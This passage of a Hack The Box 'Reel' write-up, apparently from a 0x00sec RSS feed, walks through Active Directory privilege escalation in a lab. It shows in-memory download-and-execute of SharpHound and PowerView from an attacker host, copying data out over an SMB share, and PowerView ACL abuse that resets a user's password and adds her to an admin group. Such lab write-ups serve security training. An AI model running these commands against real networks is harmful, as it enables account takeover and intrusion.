+<p>It seems they didn’t run the Cypher query against other groups. So maybe there exist a way to escalate our privileges by using another path.<br>
+If you don’t know what BloodHound is or you never worked with it, I highly recommend you to search for tutorials and to try it out.</p>
+<h2><a name="p-39495-h-10-enumeration-with-bloodhound-11" class="anchor" href="https://d.clarkee.co.uk#p-39495-h-10-enumeration-with-bloodhound-11"></a>10. Enumeration with BloodHound</h2>
+<p>So we want to use BloodHound. I will copy <strong>SharpHound.ps1</strong> to my Web servers directory. Then we will be able to download it to the ‘Reel’ machine by using <strong>Tom</strong> and store the script into memory.</p>
+<blockquote>
+<p>cp /opt/BloodHound/Ingestors/SharpHound.ps1 /var/www/html/</p>
+</blockquote>
+<p>Before we run it, we should take a look at it.<br>
+This script has a function called <strong>Invoke-BloodHound</strong> with a <strong>-CollectionMethod</strong> parameter.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/0/02a4b28e40009ea53a3032806763f2ce9ab3783a.png" data-download-href="/uploads/short-url/nnOH7T3SopLtOFqtsuLTlWrZZo.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/02a4b28e40009ea53a3032806763f2ce9ab3783a.png" alt="grafik" data-base62-sha1="nnOH7T3SopLtOFqtsuLTlWrZZo" width="690" height="456"></a></div><p></p>
+<p>Let’s start PowerShell and download the script:</p>
+<blockquote>
+<p>tom@REEL C:\Users\tom\Desktop\AD Audit&gt;powershell</p>
+</blockquote>
+<blockquote>
+<p>PS C:\Users\tom\Desktop\AD Audit&gt; IEX(New-Object Net.WebClient).downloadString(‘<a href="http://10.10.14.10/SharpHound.ps1" rel="noopener nofollow ugc">http://10.10.14.10/SharpHound.ps1</a>’)</p>
+</blockquote>
+<blockquote>
+<p>PS C:\Users\tom\Desktop\AD Audit&gt; Invoke-BloodHound -CollectionMethod All</p>
+</blockquote>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/7/7156a27ff3ed910759fa63427df1caffe50d1744.png" data-download-href="/uploads/short-url/gaDzev3XOBgCIjKrwhixcyHFK7O.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7156a27ff3ed910759fa63427df1caffe50d1744.png" alt="grafik" data-base62-sha1="gaDzev3XOBgCIjKrwhixcyHFK7O" width="690" height="441"></a></div><p></p>
+<p>Now we want to download this ZIP file and import it to BloodHound.</p>
+<h2><a name="p-39495-h-11-smb-file-transfer-12" class="anchor" href="https://d.clarkee.co.uk#p-39495-h-11-smb-file-transfer-12"></a>11. SMB File Transfer</h2>
+<p>I will use smbserver for the file transfer.</p>
+<blockquote>
+<p>impacket-smbserver SHELLAFFECT ./</p>
+</blockquote>
+<blockquote>
+<p>net view \10.10.14.10</p>
+</blockquote>
+<blockquote>
+<p>cp .\20190411050731_BloodHound.zip \\10.10.14.10\SHELLAFFECT\</p>
+</blockquote>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/c/cad2c19bcdf763861cd27872bb2529e9fa124f75.png" data-download-href="/uploads/short-url/sWfZwlw0GoWI6c7dM3BdrHERkmp.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cad2c19bcdf763861cd27872bb2529e9fa124f75.png" alt="grafik" data-base62-sha1="sWfZwlw0GoWI6c7dM3BdrHERkmp" width="690" height="270"></a></div><p></p>
+<h2><a name="p-39495-h-12-bloodhound-ad-relationships-13" class="anchor" href="https://d.clarkee.co.uk#p-39495-h-12-bloodhound-ad-relationships-13"></a>12. BloodHound AD-Relationships</h2>
+<p>Because BloodHound is a JavaScript Application and is working Neo4j database with we have to start the <strong>neo4j</strong> database first.</p>
+<blockquote>
+<p>neo4j start</p>
+</blockquote>
+<p>It’s possible that a warning with failure will appear where the <strong>neo4j</strong> will say that:</p>
+<blockquote>
+<p>WARNING: Max 1024 open files allowed, minimum of 40000 recommended. See the Neo4j manual.<br>
+/usr/share/neo4j/bin/neo4j line 451 /var/run/neo4j/neo4j.pid no such file or directory</p>
+</blockquote>
+<p>Just ignore that. It still working.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/a/a7c0c200a497c36fb726ec64bc9261d7f454c9b1.png" data-download-href="/uploads/short-url/nW0IAY3ii4h6Fxqb1ayic9Brgxr.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a7c0c200a497c36fb726ec64bc9261d7f454c9b1.png" alt="grafik" data-base62-sha1="nW0IAY3ii4h6Fxqb1ayic9Brgxr" width="589" height="500"></a></div><p></p>
+<p>Here we can import the ZIP file just by drag &amp; drop.</p>
+<p>By selecting <strong>Queries</strong> → <strong>Shortest Path to High Value Targets</strong> you’ll see a graph like this:</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/4/4979eb30f618b6823a9f9be4eaf247e0b3742313.png" data-download-href="/uploads/short-url/au041OaxsR2B1O8UM6jU613zHRp.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4979eb30f618b6823a9f9be4eaf247e0b3742313.png" alt="grafik" data-base62-sha1="au041OaxsR2B1O8UM6jU613zHRp" width="690" height="355"></a></div><p></p>
+<p>Did you remember/note what we discovered before as user <strong>nico</strong> ?<br>
+Then make a step back and retake a look.<br>
+What could be relevant to us?</p>
+<p>I will show you what I mean:</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/5/54096bd4720b31143d69fd15892b473c155fd9f8.png" data-download-href="/uploads/short-url/bZqi7RsPrcRWPq6HVQ2RCQyVHHa.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/54096bd4720b31143d69fd15892b473c155fd9f8.png" alt="grafik" data-base62-sha1="bZqi7RsPrcRWPq6HVQ2RCQyVHHa" width="365" height="493"></a></div><p></p>
+<p>That’s the reason why you should always take notes. Taking notes is also an essential skill. It will make many things easier to find and will help you to create a great report at the end of a pentest. It’s a skill that should always be practised.<br>
+Also, it helps you keep an overview of your target.</p>
+<p>When you click on the <strong>Pathfinding</strong> icon, we can search for paths.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/e/edb9ca8c53766d43430a80c16e09bab88ca8be39.png" data-download-href="/uploads/short-url/xV1dpvOtwfaGTNpvo10MpzpAUkN.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/edb9ca8c53766d43430a80c16e09bab88ca8be39.png" alt="grafik" data-base62-sha1="xV1dpvOtwfaGTNpvo10MpzpAUkN" width="690" height="309"></a></div><p></p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/8/877a902d5cfeb8d13d7cc7f82ac967d44f84e99b.png" data-download-href="/uploads/short-url/jkv327uCAjQ688jGgUL6okHpCHN.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/877a902d5cfeb8d13d7cc7f82ac967d44f84e99b.png" alt="grafik" data-base62-sha1="jkv327uCAjQ688jGgUL6okHpCHN" width="690" height="309"></a></div><p></p>
+<p>Now again, what do you see here?<br>
+Which information can we use? Make notes. Write down all your ideas. Experiment. Try it out.</p>
+<h2><a name="p-39495-h-13-privilege-escalation-using-powerview-14" class="anchor" href="https://d.clarkee.co.uk#p-39495-h-13-privilege-escalation-using-powerview-14"></a>13. Privilege Escalation using PowerView</h2>
+<p>What do we see here?</p>
+<ol>
+<li>User: Tom</li>
+<li>User: Claire</li>
+<li>Group: Backup_Admins</li>
+</ol>
+<p>Is it everything?<br>
+But there is a little bit more.</p>
+<ol start="4">
+<li><strong>WriteOwner</strong></li>
+<li><strong>GenericWrite</strong></li>
+<li><strong>WriteDacl</strong></li>
+</ol>
+<p>But what is it? If you never heard about it, search for it.</p>
+<blockquote>
+<p>Google: writeowner active directory</p>
+</blockquote>
+<p>The first result will give the information you need.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/c/c7ecd6602b59f914ce9634628483c81ef0fda9f7.png" data-download-href="/uploads/short-url/swCrbhzCW5iW5ydrQ0E6QKTx7tJ.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c7ecd6602b59f914ce9634628483c81ef0fda9f7.png" alt="grafik" data-base62-sha1="swCrbhzCW5iW5ydrQ0E6QKTx7tJ" width="467" height="248"></a></div><p></p><aside class="onebox allowlistedgeneric" data-onebox-src="https://adsecurity.org/?tag=writeowner">
+  <header class="source">
+
+      <a href="https://adsecurity.org/?tag=writeowner" target="_blank" rel="noopener nofollow ugc">adsecurity.org</a>
+  </header>
+
+  <article class="onebox-body">
+    
+
+<h3><a href="https://adsecurity.org/?tag=writeowner" target="_blank" rel="noopener nofollow ugc">WriteOwner – Active Directory &amp; Azure AD/Entra ID Security</a></h3>
+
+
+
+  </article>
+
+  <div class="onebox-metadata">
+    
+    
+  </div>
+
+  <div style="clear: both"></div>
+</aside>
+
+<p>Here is the summary:</p>
+<p><strong>WriteOwner</strong> : Provides the ability to take ownership of an object. The owner of an object can gain full control rights on the object.</p>
+<p><strong>GenericWrite</strong> : Provides write access to all properties.</p>
+<p><strong>WriteDacl</strong> : Provides the ability to modify security on an object which can lead to Full Control of the object.</p>
+<p>I highly recommend reading these articles. They’re well written and very educational. When you read it, you should notice that they used a PowerShell script called <strong>PowerView</strong>.</p>
+<p>We will use it too, and we copy it to our Web server directory.</p>
+<p><strong>[!] Important Note</strong>: Your PowerView.ps1 might be outdated. To download the newest one visit <a href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/powerview.ps1" rel="noopener nofollow ugc">Empire@Github</a>.</p>
+<p>After that, we can download it on the target machine.</p>
+<blockquote>
+<p>PS C:\Users\tom\Desktop&gt; IEX(New-Object Net.WebClient).downloadString(‘<a href="http://10.10.14.10/PowerView.ps1" rel="noopener nofollow ugc">http://10.10.14.10/PowerView.ps1</a>’)</p>
+</blockquote>
+<p>Now we will modify the owner for a specified AD object from <strong>Claire</strong> to <strong>Tom</strong>:</p>
+<blockquote>
+<p>PS C:\Users\tom\Desktop&gt; Set-DomainObjectOwner -Identity claire -OwnerIdentity tom</p>
+</blockquote>
+<p>After that, we will add an ACL for a specific AD object for the domain principal.</p>
+<blockquote>
+<p>Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword -Verbose</p>
+</blockquote>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/d/d0fbbb61e6570e6ea2938be2d87a2b121d303edb.png" data-download-href="/uploads/short-url/tOKE7r3NxxAwRnSEbbAwKUlv8bV.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d0fbbb61e6570e6ea2938be2d87a2b121d303edb.png" alt="grafik" data-base62-sha1="tOKE7r3NxxAwRnSEbbAwKUlv8bV" width="690" height="158"></a></div><p></p>
+<p>Now we set the rights to reset the password for the user <strong>Claire</strong> who provides write access to all properties and the ability to modify security on an object which can lead Full Control of the object.</p>
+<p>Let’s change the password. PowerView provides you with a function called <strong>Set-DomainUserPassword</strong> which we will use.<br>
+But first, we have to define our new password for the user <strong>Claire</strong>:</p>
+<blockquote>
+<p>PS C:\Users\tom&gt; $ClairePassword = ConvertTo-SecureString ‘Ultr4Pass!’ -AsPlainText -Force -Verbose</p>
+</blockquote>
+<blockquote>
+<p>PS C:\Users\tom&gt; Set-DomainUserPassword -Identity claire -AccountPassword $ClairePassword -Verbose</p>
+</blockquote>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/75693cf96f2203c0e2f8bccf1faf6d63eec260ca.png" alt="grafik" data-base62-sha1="gKFkOPSoftQZttS1bXjzmV7zCgq" width="690" height="70"></p>
+<p>Also, we should add the user <strong>Claire</strong> to the domain group ‘Backup_Admins’ by using the <strong>Add-DomainGroupMember</strong> function:</p>
+<blockquote>
+<p>$Cred = New-Object System.Management.Automation.PSCredential(‘HTB\claire’, $ClairePassword)</p>
+</blockquote>
+<blockquote>
+<p>Add-DomainGroupMember -Identity ‘Backup_Admins’ -Members ‘claire’ -Credential $Cred</p>
+</blockquote>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8dc3b48771a20f1d63e1c3fbcdb13784de805064.png" alt="grafik" data-base62-sha1="ke6CqpcPXp1eGU2btyquY37VqIc" width="690" height="40"></p>
+<p>And now we can use our new credentials to log in through SSH with the user <strong>Claire</strong>:</p>
+<blockquote>
+<p>ssh <a href="mailto:claire@10.10.10.77">claire@10.10.10.77</a></p>
+</blockquote>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/f/f7baa9828bc6101cb98e436c3f0f3552c3fdf975.png" data-download-href="/uploads/short-url/zlvR8lfUwRvbisJXUcA3QOwlcfb.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f7baa9828bc6101cb98e436c3f0f3552c3fdf975.png" alt="grafik" data-base62-sha1="zlvR8lfUwRvbisJXUcA3QOwlcfb" width="648" height="498"></a></div><p></p>
+<p>As always I enumerate the home directory of the user first. Then I try to take a look at the directories of other users. Previously we successfully added <strong>Claire</strong> to the domain group <strong>Backup_Admins</strong>. So we should be able to take a look at the home directory of the Administrator. There is an interesting folder called <strong>Backup Scripts</strong>. This directory has some PowerShell scripts which may reveal some useful information:</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/9/9c5bdb6b847dd37b3051d4735b06b271f2db935e.png" data-download-href="/uploads/short-url/mjdhSniltYEdlnyMIYAvD27O3Lg.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9c5bdb6b847dd37b3051d4735b06b271f2db935e.png" alt="grafik" data-base62-sha1="mjdhSniltYEdlnyMIYAvD27O3Lg" width="690" height="399"></a></div><p></p>
+<p>We found admin credentials in this script. Now we can try to login by using them and read the <strong>root.txt</strong>.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/9/96ef465f993a2221e8a1708b57e3700cfa2b5a95.png" data-download-href="/uploads/short-url/lxegpnQu4nEI1zgStXvX1Itl6W9.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/96ef465f993a2221e8a1708b57e3700cfa2b5a95.png" alt="grafik" data-base62-sha1="lxegpnQu4nEI1zgStXvX1Itl6W9" width="625" height="500"></a></div><p></p>
+<p>By the way, there is another way to get the information you need.<br>
+If you right-click at <strong>WriteOwner</strong> on the path from user <strong>Tom</strong> to <strong>Claire</strong> you will open a windows with a <strong>Help</strong> page.<br>
+</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/f/fbed9d6ad3e5a016f8d17ea1d81acca8d0c7b1d6.png" data-download-href="/uploads/short-url/zWEVPejcH2cKwU2LnUaApzGTrQa.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/fbed9d6ad3e5a016f8d17ea1d81acca8d0c7b1d6.png" alt="grafik" data-base62-sha1="zWEVPejcH2cKwU2LnUaApzGTrQa" width="378" height="310"></a></div><p></p>
+<p>If you open this Help page, you will see the information you need. These are the steps we did just additionally we improved our research skills.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/5/5383b1594b79e20cd6d0936f29b3dce1fa649a50.png" data-download-href="/uploads/short-url/bUNMofKmiuPfZR4hHj04hGDdzA4.png?dl=1" title="grafik" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5383b1594b79e20cd6d0936f29b3dce1fa649a50.png" alt="grafik" data-base62-sha1="bUNMofKmiuPfZR4hHj04hGDdzA4" width="567" height="487"></a></div><p></p>
+<h2><a name="p-39495-h-14-challenge-15" class="anchor" href="https://d.clarkee.co.uk#p-39495-h-14-challenge-15"></a>14. Challenge</h2>
+<p>Escalate your privileges by using the user <strong>Nico</strong> instead of <strong>Tom</strong> and create a new graph with modified ownership.</p>
+<p>I highly recommend watching <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA" rel="noopener nofollow ugc">IppSec</a> videos on YouTube!</p>
+<hr>
+<blockquote>
+<p>YouTube video: <a href="https://www.youtube.com/watch?v=Xq2EQRfj3Gs" rel="noopener nofollow ugc">https://www.youtube.com/watch?v=Xq2EQRfj3Gs</a></p>
+</blockquote>
+<p>Best regards,<br>
+Cry0l1t3<br>
+<a href="https://0x00sec.s3.amazonaws.com/original/2X/2/27a1e485297c69c94c88fe38429dddd5c839d998.png" class="onebox" target="_blank" rel="noopener nofollow ugc">https://0x00sec.s3.amazonaws.com/original/2X/2/27a1e485297c69c94c88fe38429dddd5c839d998.png</a></p>
+          <p><a href="https://d.clarkee.co.uk/t/htb-shell-affect-reel-writeup/12930/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/htb-shell-affect-reel-writeup/12930/1</link>
+        <pubDate>Thu, 11 Apr 2019 06:47:23 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-12930-1</guid>
+        <source url="https://d.clarkee.co.uk/t/htb-shell-affect-reel-writeup/12930.rss">[HTB] SHELL AFFECT - Reel - WriteUp</source>
+      </item>
+  </channel>
+</rss>
